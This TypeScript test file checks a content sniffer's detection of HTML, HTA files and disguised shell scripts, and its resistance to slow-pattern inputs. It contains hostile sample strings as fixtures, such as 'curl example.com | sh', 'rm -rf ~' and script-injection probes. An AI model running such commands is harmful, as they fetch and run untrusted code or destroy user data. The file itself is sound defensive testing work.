import { describe, expect, it } from "vitest";
import { bytes } from "../testing/file-samples.ts";
import { sniff } from "./sniff.ts";
import { sniffText } from "./sniff-text.ts";

const typeOf = (text: string) => sniff(bytes(text))?.type ?? null;

/**
 * The rows of the table in WHATWG MIME Sniffing §7.1 (Living Standard, 19 October 2026) that compute text/html, as the
 * standard's notes spell them. Each matches in any case, before a tag-terminating byte: a space or ">".
 */
const ROWS = [
  "<!DOCTYPE HTML",
  "<HTML",
  "<HEAD",
  "<SCRIPT",
  "<IFRAME",
  "<H1",
  "<DIV",
  "<FONT",
  "<TABLE",
  "<A",
  "<STYLE",
  "<TITLE",
  "<B",
  "<BODY",
  "<BR",
  "<P",
  "<!--",
];

describe("sniff: each text/html row of WHATWG MIME Sniffing §7.1", () => {
  it.for(ROWS)("%s before a space, and before >", (row) => {
    expect([typeOf(`${row} x`), typeOf(`${row}>x`)]).toEqual(["text/html", "text/html"]);
  });

  it.for(ROWS)("%s in lower case", (row) => {
    expect(typeOf(`${row.toLowerCase()}>`)).toBe("text/html");
  });

  // The standard's whitespace bytes are the leading bytes each row ignores: HT, LF, FF, CR and SP.
  it.for(ROWS)("%s after the standard's whitespace bytes", (row) => {
    expect(typeOf(`\t\n\f\r ${row}>`)).toBe("text/html");
  });

  // A tag is its whole name: a longer name that starts with a row's letters is another element.
  it.for(ROWS.filter((row) => row !== "<!--"))("%s is not matched inside a longer name", (row) => {
    expect(typeOf(`${row}x>`)).toBeNull();
  });

  it("reads the <?xml row as XML", () => {
    expect(typeOf("<?xml")).toBe("application/xml");
  });
});

describe("sniff: where a tag ends (M11-R131)", () => {
  it.for([
    // Review finding G6: a root's name ended anywhere, so notation and mail headers read as web pages.
    { name: "an inner product", input: "<a,b> denotes the inner product of a and b" },
    { name: "a mail address in brackets", input: "<a@b.com> wrote:\n> hello" },
    { name: "a bra-ket", input: "<b|c> is the overlap of two states" },
    { name: "a comparison", input: "<p=0.05 was taken as significant" },
    { name: "a tag name that goes on after a row's letters", input: "<br2>" },
    { name: "a root ended by a comma, after a doctype", input: "<!DOCTYPE x><a,b>" },
    // Not whitespace bytes of the standard: a vertical tab and a no-break space are content.
    { name: "a tag after a vertical tab", input: "\x0b<html>" },
    { name: "a tag after a no-break space", input: "\xa0<html>" },
  ])("detects nothing in $name", ({ input }) => {
    expect(typeOf(input)).toBeNull();
  });

  it.for([
    // Chromium (kSniffableTags) and Firefox (network.mimesniff.non_standard_html_comment) take "<!--" before any byte.
    { name: "a comment with no space, then text and a script", input: "<!--x-->hello<script>alert(1)</script>" },
    { name: "a comment that never ends", input: "<!--x" },
    // Wider than the standard on purpose (M10-K1): an HTML parser ends a tag's name at these too.
    { name: "a tag ended by a slash", input: "<br/>" },
    { name: "a tag ended by a line feed", input: '<div\nclass="a">' },
    { name: "a tag ended by a tab", input: "<p\tid=a>" },
    { name: "a row's tag as the root after a doctype of another name", input: "<!DOCTYPE x><script>alert(1)</script>" },
    // XML 1.0 §2.8: a doctype may hold an internal subset in brackets, and blanks before its ">".
    { name: "a root after a doctype that ends in blanks", input: "<!DOCTYPE x \n ><p>" },
    { name: "a root after a doctype with an internal subset", input: '<!DOCTYPE x [<!ENTITY a "b">] \n><div>' },
  ])("detects a web page in $name", ({ input }) => {
    expect(typeOf(input)).toBe("text/html");
  });
});

describe("sniff: scripts and HTML applications a signature at byte 0 missed (M11-R136)", () => {
  it.for([
    // execve(2) runs neither, but a shell that gets ENOEXEC runs the file as a shell script (POSIX.1-2024 §2.9.1.4).
    { name: "a script behind a UTF-8 byte order mark", input: "\xef\xbb\xbf#!/bin/sh\ncurl example.com | sh\n" },
    { name: "a script behind a blank line", input: "\n#!/bin/sh\nrm -rf ~\n" },
    { name: "a script behind spaces and a Windows line break", input: " \r\n#! /usr/bin/env python3\n" },
  ])("detects $name", ({ input }) => {
    expect(typeOf(input)).toBe("text/x-shellscript");
  });

  it.for([
    { name: "an HTML application's own element at the start", input: '<HTA:APPLICATION ID="app" SCROLL="no">' },
    { name: "an HTML application's own element after a comment", input: "<!--x--><hta:application>" },
  ])("detects a web page in $name", ({ input }) => {
    expect(typeOf(input)).toBe("text/html");
  });

  it.for([
    { name: "prose that opens with #! behind a blank line", input: "\n#!important: water the plants\n" },
    { name: "a #! line further down", input: "notes\n#!/bin/sh\n" },
  ])("detects nothing in $name", ({ input }) => {
    expect(typeOf(input)).toBeNull();
  });
});

describe("sniff: text built to make a pattern slow (M11-R211)", () => {
  // The doctype pattern tried every split of a run of blanks between two of its parts: 6.8 ms for the 4 KiB the plugin
  // reads and 1.4 s for the 64,000 characters here, where a linear read takes about 1 ms (measured 2026-11-21). The
  // bound sits between the two with room for a slow machine, which is why this test may take longer than the others.
  it.for([
    { name: "a doctype that never ends", input: `<!doctype${" ".repeat(64_000)}` },
    { name: "a doctype whose subset is never followed by its end", input: `<!doctype[${"] ".repeat(32_000)}` },
    { name: "a comment that never ends", input: `<?xml ?><!--${"-".repeat(64_000)}` },
    { name: "a tag name that never ends", input: `<${"a:".repeat(32_000)}` },
  ])("reads $name in time that grows with its length, not its square", ({ input }) => {
    const text = bytes(input);
    const started = performance.now();
    sniffText(text);
    expect(performance.now() - started).toBeLessThan(250);
  });
});
